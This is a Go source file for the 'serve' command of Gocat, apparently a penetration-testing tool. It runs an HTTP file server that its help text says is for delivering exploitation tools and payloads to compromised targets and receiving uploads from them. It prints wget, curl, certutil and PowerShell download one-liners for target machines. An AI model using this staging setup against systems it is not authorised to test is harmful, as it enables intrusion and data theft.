package cmd

import (
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/realibrahimsql/Gocat/internal/logger"
	"github.com/spf13/cobra"
)

var (
	serveHost   string
	servePort   int
	servePrefix string
	serveQuiet  bool
	serveUpload bool
	serveAuth   string
	serveDir    string
)

var serveCmd = &cobra.Command{
	Use:     "serve [files/directories...]",
	Aliases: []string{"fileserver", "fs", "http"},
	Short:   "Start an HTTP file server for tool delivery",
	Long: `Start a lightweight HTTP file server for serving files to targets.

Designed for serving exploitation tools, scripts, and payloads to compromised targets.

Features:
  - Serve specific files or entire directories
  - URL prefix support for organization
  - Automatic file mapping with unique URLs
  - Upload support for receiving files from targets
  - Basic authentication support
  - Shows download commands for each served file

Examples:
  gocat serve .                                  # Serve current directory
  gocat serve linpeas.sh exploit.py              # Serve specific files
  gocat serve --port 8080 --host 0.0.0.0 .       # Custom host/port
  gocat serve --prefix tools /opt/tools           # URL prefix
  gocat serve --upload                            # Enable file upload
  gocat serve --auth admin:password .             # Basic auth`,
	Args: cobra.MinimumNArgs(0),
	Run:  runServe,
}

func init() {
	rootCmd.AddCommand(serveCmd)

	serveCmd.Flags().StringVar(&serveHost, "host", "0.0.0.0", "Host/interface to bind")
	serveCmd.Flags().IntVar(&servePort, "port", 8000, "Port to listen on")
	serveCmd.Flags().StringVar(&servePrefix, "prefix", "", "URL path prefix")
	serveCmd.Flags().BoolVar(&serveQuiet, "quiet", false, "Suppress access logs")
	serveCmd.Flags().BoolVar(&serveUpload, "upload", false, "Enable file upload via PUT/POST")
	serveCmd.Flags().StringVar(&serveAuth, "auth", "", "Basic auth (user:pass)")
	serveCmd.Flags().StringVar(&serveDir, "dir", "", "Upload directory (default: ./uploads)")
}

// FileServer manages file serving with URL mapping
type FileServer struct {
	Host      string
	Port      int
	Prefix    string
	Quiet     bool
	FileMap   map[string]string
	Auth      string
	UploadDir string
	mu        sync.RWMutex
}

// NewFileServer creates a new file server
func NewFileServer(host string, port int, prefix string) *FileServer {
	return &FileServer{
		Host:    host,
		Port:    port,
		Prefix:  prefix,
		FileMap: make(map[string]string),
	}
}

// AddFile maps a file to a URL path
func (fs *FileServer) AddFile(filePath string) string {
	absPath, err := filepath.Abs(filePath)
	if err != nil {
		logger.Warn("Cannot resolve path: %s", filePath)
		return ""
	}

	if _, err := os.Stat(absPath); os.IsNotExist(err) {
		logger.Warn("File does not exist: %s", absPath)
		return ""
	}

	// Check if already mapped
	fs.mu.Lock()
	defer fs.mu.Unlock()

	for urlPath, mappedPath := range fs.FileMap {
		if mappedPath == absPath {
			return urlPath
		}
	}

	// Create URL path
	urlPath := "/" + fs.Prefix
	if fs.Prefix != "" && !strings.HasSuffix(fs.Prefix, "/") {
		urlPath += "/"
	}
	urlPath += filepath.Base(absPath)

	// Ensure uniqueness
	original := urlPath
	counter := 1
	for {
		if _, exists := fs.FileMap[urlPath]; !exists {
			break
		}
		ext := filepath.Ext(original)
		base := strings.TrimSuffix(original, ext)
		urlPath = fmt.Sprintf("%s_%d%s", base, counter, ext)
		counter++
	}

	fs.FileMap[urlPath] = absPath
	return urlPath
}

func runServe(cmd *cobra.Command, args []string) {
	fs := NewFileServer(serveHost, servePort, servePrefix)
	fs.Quiet = serveQuiet
	fs.Auth = serveAuth

	if serveUpload {
		fs.UploadDir = serveDir
		if fs.UploadDir == "" {
			fs.UploadDir = "./uploads"
		}
		os.MkdirAll(fs.UploadDir, 0o750)
	}

	// Add items to serve
	items := args
	if len(items) == 0 {
		items = []string{"."}
	}

	for _, item := range items {
		info, err := os.Stat(item)
		if err != nil {
			logger.Warn("Skipping %s: %v", item, err)
			continue
		}

		if info.IsDir() {
			// Serve entire directory
			urlPath := "/" + fs.Prefix
			if fs.Prefix != "" {
				urlPath += "/"
			}
			fs.mu.Lock()
			fs.FileMap[urlPath] = item
			fs.mu.Unlock()
		} else {
			fs.AddFile(item)
		}
	}

	if len(fs.FileMap) == 0 {
		logger.Fatal("No files to serve")
		return
	}

	// Print file map
	theme := logger.GetCurrentTheme()
	fmt.Println()

	// Get all IPs to show
	ips := []string{fs.Host}
	if fs.Host == "0.0.0.0" {
		ips = getLocalIPs()
	}

	for _, ip := range ips {
		theme.Highlight.Printf("http://%s:%d/", ip, fs.Port)
		if fs.Prefix != "" {
			fmt.Printf("%s/", fs.Prefix)
		}
		fmt.Println()

		for urlPath, filePath := range fs.FileMap {
			info, _ := os.Stat(filePath)
			icon := "[F]"
			if info != nil && info.IsDir() {
				icon = "[D]"
			}

			fullURL := fmt.Sprintf("http://%s:%d%s", ip, fs.Port, urlPath)
			theme.Success.Printf("  %s %s", icon, fullURL)
			fmt.Printf(" -> %s\n", filePath)
		}

		// Show download commands
		fmt.Println()
		theme.Warning.Println("Download commands:")
		for urlPath := range fs.FileMap {
			fullURL := fmt.Sprintf("http://%s:%d%s", ip, fs.Port, urlPath)
			fmt.Printf("  wget %s\n", fullURL)
			fmt.Printf("  curl -O %s\n", fullURL)
			fmt.Printf("  certutil -urlcache -split -f %s %%TEMP%%\\%s\n",
				fullURL, filepath.Base(urlPath))
			fmt.Printf("  powershell -c \"IWR -Uri '%s' -OutFile '%s'\"\n",
				fullURL, filepath.Base(urlPath))
			fmt.Println()
		}
	}

	// Create HTTP handler
	mux := http.NewServeMux()

	// Handle each mapped file/directory
	for urlPath, filePath := range fs.FileMap {
		localPath := filePath
		localURLPath := urlPath

		info, _ := os.Stat(localPath)
		if info != nil && info.IsDir() {
			// Serve directory
			fileServer := http.FileServer(http.Dir(localPath))
			prefix := localURLPath
			if !strings.HasSuffix(prefix, "/") {
				prefix += "/"
			}
			mux.Handle(prefix, http.StripPrefix(prefix, fileServer))
		} else {
			// Serve single file
			mux.HandleFunc(localURLPath, func(w http.ResponseWriter, r *http.Request) {
				http.ServeFile(w, r, localPath)
			})
		}
	}

	// Index handler
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}

		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, "<html><head><title>GoCat File Server</title></head><body>")
		fmt.Fprintf(w, "<h2>GoCat File Server</h2><ul>")
		for urlPath := range fs.FileMap {
			fmt.Fprintf(w, "<li><a href=\"%s\">%s</a></li>", urlPath, urlPath)
		}
		fmt.Fprintf(w, "</ul></body></html>")
	})

	// Upload handler
	if serveUpload {
		mux.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
			if r.Method == "PUT" || r.Method == "POST" {
				handleUpload(w, r, fs.UploadDir)
			} else {
				// Show upload form
				w.Header().Set("Content-Type", "text/html")
				fmt.Fprintf(w, `<html><body>
					<h2>Upload File</h2>
					<form method="POST" enctype="multipart/form-data" action="/upload">
						<input type="file" name="file">
						<button type="submit">Upload</button>
					</form>
				</body></html>`)
			}
		})
	}

	// Wrap with logging and auth
	handler := loggingHandler(fs, authHandler(fs, mux))

	// Start server
	addr := fmt.Sprintf("%s:%d", fs.Host, fs.Port)
	if (fs.Host == "0.0.0.0" || fs.Host == "::") && fs.Auth == "" {
		logger.Warn("Serving on all interfaces without auth; prefer --host 127.0.0.1 or --auth user:pass")
	}
	if serveUpload && fs.Auth == "" {
		logger.Warn("Uploads enabled without auth: anyone who can reach %s can write files", addr)
	}
	logger.Info("Starting file server on %s", addr)

	server := &http.Server{
		Addr:              addr,
		Handler:           handler,
		ReadTimeout:       30 * time.Second,
		ReadHeaderTimeout: 10 * time.Second,
		WriteTimeout:      60 * time.Second,
		IdleTimeout:       120 * time.Second,
		MaxHeaderBytes:    1 << 20,
	}
	if err := server.ListenAndServe(); err != nil {
		logger.Fatal("Server error: %v", err)
	}
}

// sanitizeUploadFilename strips any path from a client-supplied name and
// rejects empty, dot, absolute, and separator-carrying results, so uploads
// can never escape the upload directory.
func sanitizeUploadFilename(name string) string {
	name = filepath.Base(strings.TrimSpace(name))
	if name == "" || name == "." || name == ".." {
		return ""
	}
	if strings.ContainsAny(name, `/\`) {
		return ""
	}
	return name
}

func handleUpload(w http.ResponseWriter, r *http.Request, uploadDir string) {
	// Cap upload bodies: 100MB shared with the multipart path below.
	r.Body = http.MaxBytesReader(w, r.Body, 100<<20)
	if r.Method == "PUT" {
		// Handle PUT upload
		filename := sanitizeUploadFilename(r.URL.Query().Get("filename"))
		if filename == "" {
			filename = "uploaded_file"
		}

		outPath := filepath.Join(uploadDir, filename)
		outFile, err := os.Create(outPath)
		if err != nil {
			http.Error(w, "Failed to create file", http.StatusInternalServerError)
			return
		}
		defer outFile.Close()

		written, err := outFile.ReadFrom(r.Body)
		if err != nil {
			http.Error(w, "Failed to save file", http.StatusInternalServerError)
			return
		}

		logger.Info("Received file: %s (%d bytes)", outPath, written)
		fmt.Fprintf(w, "OK: %d bytes\n", written)
		return
	}

	// Handle multipart POST upload (body already capped above; keep 10MB in RAM)
	r.ParseMultipartForm(10 << 20)
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Failed to read upload", http.StatusBadRequest)
		return
	}
	defer file.Close()

	filename := sanitizeUploadFilename(header.Filename)
	if filename == "" {
		http.Error(w, "Invalid filename", http.StatusBadRequest)
		return
	}

	outPath := filepath.Join(uploadDir, filename)
	outFile, err := os.Create(outPath)
	if err != nil {
		http.Error(w, "Failed to create file", http.StatusInternalServerError)
		return
	}
	defer outFile.Close()

	written, err := outFile.ReadFrom(file)
	if err != nil {
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}

	logger.Info("Received file: %s (%d bytes)", outPath, written)
	fmt.Fprintf(w, "OK: %s (%d bytes)\n", filename, written)
}

func loggingHandler(fs *FileServer, next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !fs.Quiet {
			logger.Info("[%s] FileServer(%s:%d) [%s] \"%s %s %s\"",
				r.RemoteAddr, fs.Host, fs.Port,
				r.RemoteAddr, r.Method, r.URL.Path, r.Proto)
		}
		next.ServeHTTP(w, r)
	})
}

func authHandler(fs *FileServer, next http.Handler) http.Handler {
	if fs.Auth == "" {
		return next
	}

	parts := strings.SplitN(fs.Auth, ":", 2)
	if len(parts) != 2 {
		logger.Fatal("Invalid auth format. Use user:password")
		return next
	}

	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		user, pass, ok := r.BasicAuth()
		if !ok || user != parts[0] || pass != parts[1] {
			w.Header().Set("WWW-Authenticate", `Basic realm="GoCat FileServer"`)
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func getLocalIPs() []string {
	var ips []string
	ifaces, err := net.Interfaces()
	if err != nil {
		return []string{"0.0.0.0"}
	}

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.IP.String())
			}
		}
	}

	if len(ips) == 0 {
		return []string{"0.0.0.0"}
	}
	return ips
}
